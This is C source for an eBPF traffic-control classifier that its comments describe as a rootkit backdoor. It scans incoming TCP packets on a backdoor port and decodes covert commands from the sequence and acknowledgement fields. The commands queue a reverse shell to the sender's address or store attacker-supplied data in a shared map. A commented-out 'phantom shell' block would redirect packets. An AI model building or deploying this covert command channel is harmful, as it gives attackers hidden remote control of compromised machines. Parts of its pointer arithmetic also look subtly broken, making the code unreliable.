
#include <arpa/inet.h>
#include <endian.h>
#include <linux/bpf.h>
#include <linux/if_ether.h>
#include <linux/ip.h>
#include <linux/pkt_cls.h>
#include <linux/swab.h>
#include <linux/tcp.h>
#include <linux/types.h>
// #include <bpf/libbpf.h>
// #include <bpf/libbpf.h>
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <netinet/in.h>
// #include <bpf/bpf_core_read.h>
// #include <bpf/bpf_endian.h>
// #include <bpf/bpf.h>

#include "constant.h"

struct TrafficOperation {
    unsigned int type;
    unsigned int host;
    unsigned int port;
    unsigned int offset;
    unsigned int data;
};

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __type(key, __u32);
    __type(value, struct TrafficOperation);
    __uint(max_entries, 3);
} traffic_ops SEC(".maps");

const int debug = 0;

SEC("tc")
int classifier_ingress(struct __sk_buff* skb)
{
    void* data = (void*)(__u64)skb->data;
    void* data_end = (void*)(__u64)skb->data_end;

    // bpf_printk("TC ingress classifier called\n");

    // We are interested on parsing TCP/IP packets so let's assume we have one
    // Ethernet header
    struct ethhdr* eth = data;
    if ((void*)eth + sizeof(struct ethhdr) > data_end) {
        bpf_printk("ETH\n");
        return TC_ACT_OK;
    }
    if (eth->h_proto != htons(ETH_P_IP)) {
        // Not an IP packet
        bpf_printk("IP\n");
        return TC_ACT_OK;
    }

    // IP header
    struct iphdr* ip = (struct iphdr*)(data + sizeof(struct ethhdr));
    if ((void*)ip + sizeof(struct iphdr) > data_end) {
        // bpf_printk("IP CHECK, ip: %llx, data: %llx, datalen: %llx\n", ip, data,
        // data_end);
        return TC_ACT_OK;
    }
    if (ip->protocol != IPPROTO_TCP) {
        // bpf_printk("TCP\n");
        return TC_ACT_OK;
    }

    // TCP header
    struct tcphdr* tcp = (struct tcphdr*)(data + sizeof(struct ethhdr) + sizeof(struct iphdr));
    if ((void*)tcp + sizeof(struct tcphdr) > data_end) {
        // bpf_printk("TCP CHECK\n");
        return TC_ACT_OK;
    }

    // We now proceed to scan for our backdoor packets
    __u16 dest_port = ntohs(tcp->dest);

    if (dest_port != 22 && dest_port < 10000) {
        bpf_printk("PORT CHECK: %u\n", dest_port);
    }
    if (dest_port != BACKDOOR_PORT) {
        return TC_ACT_OK;
    }

    if (debug) {
        bpf_printk("Detected bounds: data:%llx, data_end:%llx", data, data_end);
        bpf_printk("Detected headers: \n\teth:%llx\n\tip:%llx\n\ttcp:%llx\n", eth, ip,
            tcp);
    }

    __u32 payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);

    if (debug) {
        bpf_printk("ip_totlen: %u, tcp_doff*4: %u, ip_ihl: %u\n", ntohs(ip->tot_len),
            tcp->doff * 4, ip->ihl * 4);
    }

    char* payload = (void*)(tcp + tcp->doff * 4);
    if (((void*)payload + payload_size > data_end) && debug) {
        bpf_printk(
            "PAYLOAD CHECK, payload:%llx, payload_size:%llx, data_end:%llx\n",
            payload, payload_size, data_end);
    }
    bpf_printk("TCP HDR INFOS:\nSEQ: %lx\nSEQ-ACK: %lx\nWINDOW: %u\nURG-PTR: %u\n", ntohl(tcp->seq), ntohl(tcp->ack_seq), tcp->window, tcp->urg_ptr);

    __u32 counter_k = COUNTER;
    struct TrafficOperation* counter_v = bpf_map_lookup_elem(&traffic_ops, &counter_k);
    struct TrafficOperation new_counter_v = { 0 };
    if (counter_v != NULL) {
        bpf_printk("Updating counter\n");
        new_counter_v.type = COUNTER;
        new_counter_v.offset = counter_v->offset + 1;
        bpf_map_update_elem(&traffic_ops, &counter_k, &new_counter_v, BPF_ANY);
    } else {
        bpf_printk("Initializing counter\n");
        new_counter_v.type = COUNTER;
        new_counter_v.offset = 0;
        bpf_map_update_elem(&traffic_ops, &counter_k, &new_counter_v, BPF_ANY);
    }

    __u32 seq = be32toh(tcp->seq);

    if ((seq & 0xff000000) == 0x01000000) {
        unsigned int rev_port = seq & 0x0000ffff;
        unsigned int rev_host = be32toh(ip->saddr);
        bpf_printk("Doing revshell to %d:%d\n", rev_host, rev_port);

        __u32 rev_k = REVSHELL_PORT;
        struct TrafficOperation* rev_v = bpf_map_lookup_elem(&traffic_ops, &rev_k);
        struct TrafficOperation new_rev_v = { 0 };
        new_rev_v.type = REVSHELL_PORT;
        new_rev_v.port = rev_port;
        new_rev_v.host = rev_host;
        bpf_map_update_elem(&traffic_ops, &rev_k, &new_rev_v, BPF_ANY);
    }

    if ((seq & 0xff000000) == 0x02000000 && tcp->ack_seq != 0) {
        unsigned int offset = seq & 0x000fffff;
        unsigned int lport = (seq >> 20) & 0xf;
        unsigned int host = be32toh(ip->saddr);
        unsigned int data = be32toh(tcp->ack_seq);

        __u32 data_k = DATA;
        struct TrafficOperation* data_v = bpf_map_lookup_elem(&traffic_ops, &data_k);
        struct TrafficOperation new_data_v = { 0 };
        new_data_v.type = DATA;
        new_data_v.host = host;
        new_data_v.port = lport;
        new_data_v.data = data;
        new_data_v.offset = offset;
        bpf_map_update_elem(&traffic_ops, &data_k, &new_data_v, BPF_ANY);
    }

    // We redirect whatever packet this is to the rootkit
    // The TCP retransmissions will be in charge of resending it correctly later
    /*__u64 key = 1;
    struct backdoor_phantom_shell_data *ps_data = (struct
    backdoor_phantom_shell_data*) bpf_map_lookup_elem(&backdoor_phantom_shell,
    &key); struct backdoor_phantom_shell_data ps_new_data = {0}; if(ps_data ==
    (void*)0){
    //Phantom shell not active
    bpf_printk("Phantom shell NOT active anytime\n");
    ps_new_data.active = 4;
    ps_new_data.d_ip = 1;
    ps_new_data.d_port = 1;
    int err = bpf_map_update_elem(&backdoor_phantom_shell, &key,
    &ps_new_data, BPF_ANY); if(err<0){ bpf_printk("Fail to update map\n");
    }
    return TC_ACT_OK;
    }
    if(ps_data->active == 0){
    bpf_printk("Phantom shell NOT active now\n");
    ps_new_data.active = 5;
    ps_new_data.d_ip = 1;
    ps_new_data.d_port = 1;
    int err = bpf_map_update_elem(&backdoor_phantom_shell, &key,
    &ps_new_data, BPF_ANY); if(err<0){ bpf_printk("Fail to update map\n");
    }
    return TC_ACT_OK;
    }
    ps_new_data.active = 6;
    ps_new_data.d_ip = 1;
    ps_new_data.d_port = 1;
    int err = bpf_map_update_elem(&backdoor_phantom_shell, &key, &ps_new_data,
    BPF_ANY); if(err<0){ bpf_printk("Fail to update map\n");
    }

    bpf_printk("Phantom shell active now: active is %i\n", ps_data->active);
    __u32 new_ip = ps_data->d_ip;
    __u16 new_port = ps_data->d_port;
    __u32 offset_ip = offsetof(struct iphdr, daddr)+ sizeof(struct ethhdr);
    __u16 offset_port = offsetof(struct tcphdr, dest)+ sizeof(struct ethhdr) +
    sizeof(struct iphdr); bpf_printk("offset ip: %u\n", offset_ip); int ret =
    bpf_skb_store_bytes(skb, offset_ip, &new_ip, sizeof(__u32),
    BPF_F_RECOMPUTE_CSUM); if (ret < 0) { bpf_printk("Failed to overwrite
    destination ip: %d\n", ret); return TC_ACT_OK;
    }
    bpf_printk("offset port: %u\n", offset_port);
    ret = bpf_skb_store_bytes(skb, offset_port, &new_port, sizeof(__u16),
    BPF_F_RECOMPUTE_CSUM); if (ret < 0) { bpf_printk("Failed to overwrite
    destination port: %d\n", ret); return TC_ACT_OK;
    }*/

    return TC_ACT_OK;
}

char _license[4] SEC("license") = "GPL";